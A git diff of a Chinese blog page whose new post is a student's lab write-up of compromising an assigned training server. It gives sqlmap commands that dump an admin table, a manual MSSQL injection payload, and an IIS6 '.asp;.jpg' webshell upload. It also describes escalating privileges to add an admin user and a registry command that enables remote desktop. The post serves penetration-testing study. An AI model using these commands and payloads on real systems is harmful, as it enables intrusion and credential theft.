@@ -6,17 +6,41 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://muradil.github.io">
-  <title>开始学习逆向的第一天 | 笔芯の博客</title>
+  <title>mssql注入到拿下服务器 | 笔芯の博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="keywords" content="-逆向">
+  <meta name="description" content="【背景】：最近在学web渗透测试，老师丢我们一个IP地址让我们拿下服务器 （） 服务器地址为：192.168.144.190 首先拿到了IP之后先对服务器进行信息收集这里用nmap对服务器进行端口扫描发现开了一些端口  发现开了3306端口判断为开了数据库服务，然后还开了8000端口猜测一下可能是http服务尝试着拿浏览器访问地址发现了一个网站随手点了几个链接感觉像注入点">
+<meta name="keywords" content="web渗透测试,渗透测试,sql注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="开始学习逆向的第一天">
-<meta property="og:url" content="http://muradil.github.io/2019/05/22/开始学习逆向第一天/index.html">
+<meta property="og:title" content="mssql注入到拿下服务器">
+<meta property="og:url" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/index.html">
 <meta property="og:site_name" content="笔芯の博客">
+<meta property="og:description" content="【背景】：最近在学web渗透测试，老师丢我们一个IP地址让我们拿下服务器 （） 服务器地址为：192.168.144.190 首先拿到了IP之后先对服务器进行信息收集这里用nmap对服务器进行端口扫描发现开了一些端口  发现开了3306端口判断为开了数据库服务，然后还开了8000端口猜测一下可能是http服务尝试着拿浏览器访问地址发现了一个网站随手点了几个链接感觉像注入点">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-03T11:19:54.370Z">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/01.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/02.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/11.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/03.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/baoku.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/ziduan.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/账号密码.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/1.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/houtai.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/getshell.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/06.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/07.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/08.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/09.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/0101.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/tiquan.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/0000.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/tiquan2.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/tiquan3.PNG">
+<meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/010.PNG">
+<meta property="og:updated_time" content="2019-08-15T14:16:25.933Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="开始学习逆向的第一天">
+<meta name="twitter:title" content="mssql注入到拿下服务器">
+<meta name="twitter:description" content="【背景】：最近在学web渗透测试，老师丢我们一个IP地址让我们拿下服务器 （） 服务器地址为：192.168.144.190 首先拿到了IP之后先对服务器进行信息收集这里用nmap对服务器进行端口扫描发现开了一些端口  发现开了3306端口判断为开了数据库服务，然后还开了8000端口猜测一下可能是http服务尝试着拿浏览器访问地址发现了一个网站随手点了几个链接感觉像注入点">
+<meta name="twitter:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/01.PNG">
   
     <link rel="alternative" href="/atom.xml" title="笔芯の博客" type="application/atom+xml">
   
@@ -172,27 +196,81 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-开始学习逆向第一天" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-mssql注入到拿下服务器" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      开始学习逆向的第一天
+      mssql注入到拿下服务器
     </h1>
   
 
         
-        <a href="/2019/05/22/开始学习逆向第一天/" class="archive-article-date">
-  	<time datetime="2019-05-22T02:08:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-22</time>
+        <a href="/2019/08/15/mssql注入到拿下服务器/" class="archive-article-date">
+  	<time datetime="2019-08-15T02:08:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p> <meta name="referrer" content="no-referrer"><br>【背景】：最近在学web渗透测试，老师丢我们一个IP地址让我们拿下服务器</p>
+<p>（）</p>
+<p>服务器地址为：192.168.144.190</p>
+<p>首先拿到了IP之后先对服务器进行信息收集这里用nmap对服务器进行端口扫描发现开了一些端口</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/01.PNG" alt></p>
+<p>发现开了3306端口判断为开了数据库服务，然后还开了8000端口猜测一下可能是http服务尝试着拿浏览器访问地址发现了一个网站随手点了几个链接感觉像注入点<br><a id="more"></a><br><img src="/2019/08/15/mssql注入到拿下服务器/02.PNG" alt></p>
+<p>拿着连接扔到了sqlmap里面</p>
+<p><code>sqlmap -u http://192.168.144.190:8000/onews.asp?id=181</code> 判断是否为注入点</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/11.PNG" alt></p>
+<p>回显出版本信息和注入点类型发现存在注入点，然后爆出他的服务器可能是2003的或者xp iis6.0然后是SQL Server2005的数据库，继续爆库</p>
+<p><code>sqlmap -u http://192.168.144.190:8000/onews.asp?id=181 --dbs</code> 爆出所有数据库的名称</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/03.PNG" alt></p>
+<p>爆出库，其中aa这个数据库很可疑，尝试跑里面的表</p>
+<p><code>sqlmap -u http://192.168.144.190:8000/onews.asp?id=181 -D  aa(数据库名) --tables（爆出表名）</code>            </p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/baoku.PNG" alt></p>
+<p>发现admin表，里面可能有管理员账号密码，继续尝试列名称</p>
+<p><code>sqlmap -u http://192.168.144.190:8000/onews.asp?id=181 -D  aa(数据库名) -T admin（表名）--columns（爆出列名）</code>            </p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/ziduan.PNG" alt></p>
+<p>爆出了字段名admin，password，继续尝试爆出字段的内容</p>
+<p><code>sqlmap -u http://192.168.144.190:8000/onews.asp?id=181 -D  aa(数据库名) -T admin（表名）-C（列名） admin,password --dump （爆出字段内容）</code>        </p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/账号密码.PNG" alt></p>
+<p>爆出账号密码后乱码了可能是因为mssql数据库的原因尝试着构造手工注入</p>
+<p>？     跟在哪</p>
+<p><code>and (select top 1 password from aa.dbo.admin where admin not in (select top 1 admin from aa.dbo.admin) )&gt;1</code></p>
+<p>尝试着让他报错然后爆出密码</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/1.PNG" alt></p>
+<p>这里爆出了MD5加密之后的密码我尝试着解密之后拿到明文密码Cisco123，然后再网站的最下面发现网站后台登陆的地址是<code>admin/index.asp</code></p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/houtai.PNG" alt></p>
+<p>登录之后尝试着getshell发现了一个上传点</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/getshell.PNG" alt></p>
+<p>因为是iis6.0在这里猜测可能会有解析漏洞，尝试着构造<code>.asp;.jpg</code>后缀的图片进行上传，发现上传成功</p>
+<p>(在前面判断注入的时候发现iis6.0)</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/06.PNG" alt></p>
+<p>但是找不到木马的路径不管怎么尝试都找不到木马的路径，细心的看了一下，发现首页小图几个字样，就在首页上寻找发现在轮播图哪里发现了木马的连接</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/07.PNG" alt></p>
+<p>木马在uppic的目录下，真是。。。然后尝试着用连接一句话</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/08.PNG" alt></p>
+<p>连接成功，但是发现权限太低，执行不了命令</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/09.PNG" alt></p>
+<p>所以自己上传了个cmd.exe和pr.exe（在这里因为是2003的系统要上传32位的cmd，所以从虚拟机里拷贝出32位cmd.exe程序）</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/0101.PNG" alt></p>
+<p>用自己上传的cmd和pr进行提权，加入了一个admin的用户</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/tiquan.PNG" alt></p>
+<p>查看端口发现没有打开3389端口</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/0000.PNG" alt></p>
+<p>用注册表命令打开3389端口，但是可能是因为引号的原因发现命令执行失败</p>
+<p><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/tiquan2.PNG" alt></p>
+<p>尝试把命令加入到bat里面执行，发现执行成功，成功打开远程</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/tiquan3.PNG" alt></p>
+<p>然后进行远程连接，成功连接，输入自己添加的用户名密码登录</p>
+<p><img src="/2019/08/15/mssql注入到拿下服务器/010.PNG" alt>最后删除自己添加的用户以及删除shell，0一次简单的渗透到此结束！！！</p>
+<p>最后感谢baynk老师</p>
+<p>参考：<a href="https://blog.csdn.net/u014029795/article/details/91359670" target="_blank" rel="noopener">https://blog.csdn.net/u014029795/article/details/91359670</a></p>
+
       
 
       
@@ -231,7 +309,15 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">-逆向</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">web渗透测试</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
         		</li>
       		
 		</ul>
@@ -287,7 +373,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://muradil.github.io/2019/05/22/开始学习逆向第一天/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -301,18 +387,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/08/15/mssql注入到拿下服务器/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          mssql注入到拿下服务器
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/05/22/bwapp用nc反弹shell/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">bwapp用nc反弹shell</div>
+    <a href="/2019/05/22/开始学习逆向第一天/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">开始学习逆向的第一天</div>
       <i class="icon-circle-right"></i>
     </a>
   
